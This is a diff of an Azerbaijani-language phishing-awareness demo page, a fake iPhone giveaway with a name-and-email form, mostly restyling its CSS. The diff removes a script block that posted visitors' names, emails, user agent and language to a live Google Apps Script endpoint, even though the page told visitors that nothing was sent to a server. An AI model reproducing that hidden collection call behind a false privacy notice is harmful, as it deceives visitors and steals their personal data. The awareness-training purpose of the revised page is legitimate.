@@ -4,87 +4,104 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>iPhone Giveaway</title>
+ 
 <style>
 * {
   box-sizing: border-box;
   margin: 0;
   padding: 0;
 }
+ 
 body {
   min-height: 100vh;
-  font-family: Arial, sans-serif;
-  color: white;
-  background: #080b20;
+  font-family: 'Segoe UI', Arial, sans-serif;
+  color: #f0fdf4;
+  background: #060908;
   overflow-x: hidden;
 }
+ 
 body::before {
   content: "";
   position: fixed;
   inset: -50%;
   z-index: -1;
   background:
-    radial-gradient(circle at 25% 30%, #743cff66, transparent 30%),
-    radial-gradient(circle at 75% 70%, #00d9ff44, transparent 30%),
-    radial-gradient(circle at 50% 50%, #171d49, #080b20 65%);
-  animation: backgroundMove 12s ease-in-out infinite alternate;
+    radial-gradient(circle at 20% 25%, #05966955, transparent 35%),
+    radial-gradient(circle at 80% 75%, #06b6d433, transparent 35%),
+    radial-gradient(circle at 50% 50%, #091a14, #060908 70%);
+  animation: backgroundMove 14s ease-in-out infinite alternate;
 }
+ 
 @keyframes backgroundMove {
-  to { transform: translate(5%, -4%) rotate(8deg); }
+  to { transform: translate(4%, -4%) rotate(6deg); }
 }
+ 
 header {
   display: flex;
   justify-content: space-between;
   align-items: center;
   padding: 25px 8%;
 }
+ 
 .logo {
   font-size: 22px;
   font-weight: 800;
-  letter-spacing: 1px;
+  letter-spacing: 1.5px;
 }
-.logo span { color: #8b7cff; }
+ 
+.logo span { color: #34d399; }
+ 
 .tag {
-  border: 1px solid #ffffff35;
-  padding: 9px 14px;
+  border: 1px solid #10b98135;
+  padding: 9px 16px;
   border-radius: 30px;
   font-size: 12px;
-  color: #c9c5ff;
+  color: #a7f3d0;
+  background: #065f4622;
+  backdrop-filter: blur(10px);
 }
+ 
 main {
-  width: min(1000px, 90%);
-  margin: 35px auto 70px;
+  width: min(1050px, 90%);
+  margin: 30px auto 70px;
   display: grid;
   grid-template-columns: 1fr 1fr;
   align-items: center;
   gap: 55px;
 }
+ 
 .badge {
   display: inline-block;
-  padding: 9px 14px;
+  padding: 8px 16px;
   border-radius: 30px;
-  background: #8b5cf622;
-  border: 1px solid #a78bfa66;
-  color: #c4b5fd;
+  background: #065f4633;
+  border: 1px solid #34d39966;
+  color: #6ee7b7;
   font-size: 12px;
+  font-weight: 600;
   margin-bottom: 22px;
 }
+ 
 h1 {
-  font-size: clamp(38px, 5vw, 62px);
-  line-height: 1.08;
-  letter-spacing: -2px;
+  font-size: clamp(38px, 5vw, 60px);
+  line-height: 1.1;
+  letter-spacing: -1.5px;
   margin-bottom: 20px;
 }
+ 
 h1 span {
-  background: linear-gradient(90deg, #b9a5ff, #53e5ff);
+  background: linear-gradient(90deg, #6ee7b7, #38bdf8);
   color: transparent;
   background-clip: text;
 }
+ 
 .description {
-  color: #b8bfd9;
+  color: #94a3b8;
   line-height: 1.8;
   font-size: 15px;
   margin-bottom: 28px;
 }
+ 
 .phone-area {
   min-height: 320px;
   display: flex;
@@ -92,26 +109,29 @@ h1 span {
   justify-content: center;
   position: relative;
 }
+ 
 .glow {
   position: absolute;
-  width: 250px;
-  height: 250px;
-  background: #7157ff55;
-  filter: blur(65px);
+  width: 260px;
+  height: 260px;
+  background: #10b98133;
+  filter: blur(75px);
   border-radius: 50%;
 }
+ 
 .phone {
   position: relative;
   width: 150px;
   height: 290px;
-  border: 4px solid #aaa9c9;
+  border: 4px solid #334155;
   border-radius: 32px;
-  background: linear-gradient(145deg, #363d61, #090c1d 70%);
-  box-shadow: 0 0 45px #7b61ff44,
-              inset 0 0 15px #ffffff13;
+  background: linear-gradient(145deg, #1e293b, #0f172a 70%);
+  box-shadow: 0 0 50px #10b98125,
+              inset 0 0 15px #ffffff10;
   animation: float 4s ease-in-out infinite;
-  transform: rotate(-8deg);
+  transform: rotate(-6deg);
 }
+ 
 .phone::before {
   content: "";
   position: absolute;
@@ -120,10 +140,11 @@ h1 span {
   transform: translateX(-50%);
   width: 52px;
   height: 14px;
-  background: #050611;
+  background: #020617;
   border-radius: 12px;
   z-index: 2;
 }
+ 
 .phone-screen {
   position: absolute;
   inset: 5px;
@@ -132,214 +153,223 @@ h1 span {
   display: grid;
   place-items: center;
   background:
-    radial-gradient(circle at 70% 30%, #ff9bd6, transparent 35%),
-    radial-gradient(circle at 25% 70%, #6854ff, transparent 40%),
-    linear-gradient(150deg, #171d50, #08bcd4);
+    radial-gradient(circle at 70% 30%, #34d39966, transparent 40%),
+    radial-gradient(circle at 25% 70%, #0284c766, transparent 40%),
+    linear-gradient(150deg, #0f172a, #065f46);
 }
+ 
 .apple {
   font-size: 82px;
-  text-shadow: 0 0 30px #ffffff66;
+  text-shadow: 0 0 30px #34d39966;
 }
+ 
 @keyframes float {
-  0%, 100% { transform: translateY(0) rotate(-8deg); }
-  50% { transform: translateY(-16px) rotate(-4deg); }
+  0%, 100% { transform: translateY(0) rotate(-6deg); }
+  50% { transform: translateY(-14px) rotate(-2deg); }
 }
+ 
 .card {
-  padding: 30px;
-  background: #ffffff0b;
-  border: 1px solid #ffffff20;
-  border-radius: 25px;
-  backdrop-filter: blur(20px);
-  box-shadow: 0 20px 60px #00000035;
+  padding: 35px;
+  background: #0f172a88;
+  border: 1px solid #33415566;
+  border-radius: 28px;
+  backdrop-filter: blur(25px);
+  box-shadow: 0 25px 60px rgba(0, 0, 0, 0.4);
 }
+ 
 .card h2 {
-  font-size: 25px;
-  margin-bottom: 9px;
+  font-size: 26px;
+  margin-bottom: 8px;
+  color: #f8fafc;
 }
+ 
 .card > p {
-  color: #aeb6d2;
-  font-size: 13px;
+  color: #94a3b8;
+  font-size: 13.5px;
   line-height: 1.7;
   margin-bottom: 24px;
 }
+ 
 label {
   display: block;
-  color: #d9def3;
+  color: #cbd5e1;
   font-size: 13px;
+  font-weight: 500;
   margin: 15px 0 8px;
 }
+ 
 input {
   width: 100%;
   padding: 15px;
-  background: #090d22;
-  border: 1px solid #ffffff20;
-  border-radius: 12px;
+  background: #020617;
+  border: 1px solid #334155;
+  border-radius: 14px;
   color: white;
   outline: none;
-  transition: .25s;
+  font-size: 14px;
+  transition: all 0.3s ease;
 }
+ 
 input:focus {
-  border-color: #9c88ff;
-  box-shadow: 0 0 0 3px #8b5cf622;
+  border-color: #34d399;
+  box-shadow: 0 0 0 4px #10b98122;
 }
+ 
 button {
   width: 100%;
   padding: 16px;
-  margin-top: 22px;
+  margin-top: 24px;
   border: none;
-  border-radius: 12px;
-  background: linear-gradient(100deg, #8262ff, #38c9ed);
+  border-radius: 14px;
+  background: linear-gradient(135deg, #059669, #0284c7);
   color: white;
-  font-weight: bold;
+  font-weight: 700;
   font-size: 15px;
   cursor: pointer;
-  transition: .25s;
+  transition: all 0.3s ease;
+  box-shadow: 0 4px 20px #05966944;
 }
+ 
 button:hover {
-  transform: translateY(-3px);
-  box-shadow: 0 10px 30px #6c62ff55;
+  transform: translateY(-2px);
+  box-shadow: 0 8px 25px #05966966;
 }
+ 
 .note {
   text-align: center;
-  color: #929cbd;
-  font-size: 11px;
+  color: #64748b;
+  font-size: 11.5px;
   line-height: 1.7;
-  margin-top: 17px;
+  margin-top: 20px;
 }
+ 
 #result {
   display: none;
   margin-top: 20px;
   padding: 18px;
   border-radius: 14px;
   line-height: 1.7;
-  background: #ff40551a;
-  border: 1px solid #ff617355;
+  background: #ef44441a;
+  border: 1px solid #ef444455;
   overflow-wrap: anywhere;
 }
+ 
 #result h3 {
-  color: #ff8c9b;
-  margin-bottom: 8px;
+  color: #fca5a5;
+  margin-bottom: 6px;
+  font-size: 15px;
 }
+ 
 #result p {
   font-size: 13px;
-  color: #e0e5f8;
+  color: #f1f5f9;
 }
+ 
 footer {
   text-align: center;
   padding: 25px;
-  color: #858eae;
+  color: #64748b;
   font-size: 12px;
 }
+ 
 @media (max-width: 750px) {
   header { padding: 22px 6%; }
   main {
     grid-template-columns: 1fr;
-    gap: 25px;
-    margin-top: 20px;
+    gap: 30px;
+    margin-top: 15px;
   }
-  .phone-area { min-height: 300px; }
+  .phone-area { min-height: 280px; }
   .card { padding: 24px; }
   h1 { letter-spacing: -1px; }
 }
 </style>
 </head>
+ 
 <body>
+ 
 <header>
   <div class="logo">GIFT<span>ORA.</span></div>
   <div class="tag">✦ GIVEAWAY EVENT</div>
 </header>
+ 
 <main>
   <section>
-    <div class="badge">🎉 XÜSUSİ HƏDİYYƏ KAMPANİYASI</div>
-    <h1>Sən bir<br>
-      <span>iPhone qazandın!</span>
-    </h1>
-    <p class="description">
-      Möhtəşəm sürpriz səni gözləyir! Qeydiyyat formasını
-      doldur və hədiyyə kampaniyasının demo mərhələsinə keç.
-      Bu səhifə kibertəhlükəsizlik laboratoriyası üçündür.
-    </p>
-    <div class="phone-area">
-      <div class="glow"></div>
-      <div class="phone">
-        <div class="phone-screen">
-          <div class="apple">✦</div>
-        </div>
+  <div class="badge">🎉 XÜSUSİ HƏDİYYƏ KAMPANİYASI</div>
+ 
+  <h1>Sən bir<br>
+    <span>iPhone qazandın!</span>
+  </h1>
+ 
+  <p class="description">
+    Möhtəşəm sürpriz səni gözləyir! Qeydiyyat formasını
+    doldur və hədiyyə kampaniyasının demo mərhələsinə keç.
+    Bu səhifə kibertəhlükəsizlik laboratoriyası üçündür.
+  </p>
+ 
+  <div class="phone-area">
+    <div class="glow"></div>
+    <div class="phone">
+      <div class="phone-screen">
+        <div class="apple">✦</div>
       </div>
     </div>
+  </div>
   </section>
+ 
   <section class="card">
-    <h2>Qeydiyyat ✨</h2>
-    <p>Demo kampaniyasına qoşulmaq üçün məlumatları daxil et.</p>
-    <form id="demoForm">
-      <label for="fullname">Ad və soyad</label>
-      <input id="fullname" type="text"
-        placeholder="Məsələn, Aysel Məmmədova"
-        maxlength="80" required>
-      <label for="email">Demo e-poçt ünvanı</label>
-      <input id="email" type="email"
-        placeholder="demo@example.com"
-        maxlength="100" required>
-      <button type="submit">🎁 Hədiyyəni əldə et</button>
-    </form>
-    <div id="result" role="status" aria-live="polite">
-      <h3>⚠️ Simulyasiya tamamlandı!</h3>
-      <p id="resultText"></p>
-    </div>
-    <div class="note">
-      🔒 Laboratoriya demosu · Məlumatlar serverə göndərilmir.
-      <br>Real parol və şəxsi məlumat daxil etmə.
-    </div>
+  <h2>Qeydiyyat ✨</h2>
+  <p>Demo kampaniyasına qoşulmaq üçün məlumatları daxil et.</p>
+ 
+  <form id="demoForm">
+    <label for="fullname">Ad və soyad</label>
+    <input id="fullname" type="text"
+      placeholder="Məsələn, Aysel Məmmədova"
+      maxlength="80" required>
+ 
+    <label for="email">Demo e-poçt ünvanı</label>
+    <input id="email" type="email"
+      placeholder="demo@example.com"
+      maxlength="100" required>
+ 
+    <button type="submit">🎁 Hədiyyəni əldə et</button>
+  </form>
+ 
+  <div id="result" role="status" aria-live="polite">
+    <h3>⚠️ Simulyasiya tamamlandı!</h3>
+    <p id="resultText"></p>
+  </div>
+ 
+  <div class="note">
+    🔒 Laboratoriya demosu · Məlumatlar serverə göndərilmir.
+    <br>Real parol və şəxsi məlumat daxil etmə.
+  </div>
   </section>
 </main>
+ 
 <footer>
-  GIFTORA © 2026 · Təhlükəsizlik maarifləndirməsi üçün demo
+GIFTORA © 2026 · Təhlükəsizlik maarifləndirməsi üçün demo
 </footer>
+ 
 <script>
 const form = document.getElementById("demoForm");
 const result = document.getElementById("result");
 const resultText = document.getElementById("resultText");
-
-// Google Apps Script URL-in buradadır:
-const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx5mwA34ZaxJZSN-ji9HsVFdj_bQWEyEbAik0St1YWXazrXD2NdfkhPYKwNQaMP9zqWJQ/exec";
-
-form.addEventListener("submit", async function(event) {
+ 
+form.addEventListener("submit", function(event) {
   event.preventDefault();
-
-  const fullname = document.getElementById("fullname").value;
-  const email = document.getElementById("email").value;
-
-  const data = {
-    fullname: fullname,
-    email: email,
-    time: new Date().toLocaleString(),
-    userAgent: navigator.userAgent,
-    lang: navigator.language
-  };
-
-  try {
-    await fetch(GOOGLE_SCRIPT_URL, {
-      method: 'POST',
-      mode: 'no-cors',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(data)
-    });
-  } catch (error) {
-    console.error("Xəta:", error);
-  }
-
+ 
   resultText.textContent =
-    "Məlumatlarınız ələ keçirildi! — bu, yalnız fişinq " +
-    "simulyasiyasının nümayiş mesajıdır. Daxil etdiyiniz " +
-    "məlumatlar qeydə alınmadı, saxlanılmadı və " +
-    "heç bir real serverə göndərilmədi. Şübhəli hədiyyə " +
-    "linklərinə etibar etməzdən əvvəl mənbəni yoxla.";
-
+  "Məlumatlarınız ələ keçirildi! — bu, yalnız fişinq " +
+  "simulyasiyasının nümayiş mesajıdır. Daxil etdiyiniz " +
+  "məlumatlar qeydə alınmayıb, saxlanılmayıb və " +
+  "heç bir serverə göndərilməyib. Şübhəli hədiyyə " +
+  "linklərinə etibar etməzdən əvvəl mənbəni yoxla.";
+ 
   result.style.display = "block";
   result.scrollIntoView({ behavior: "smooth", block: "nearest" });
 });
 </script>
+ 
 </body>
 </html>
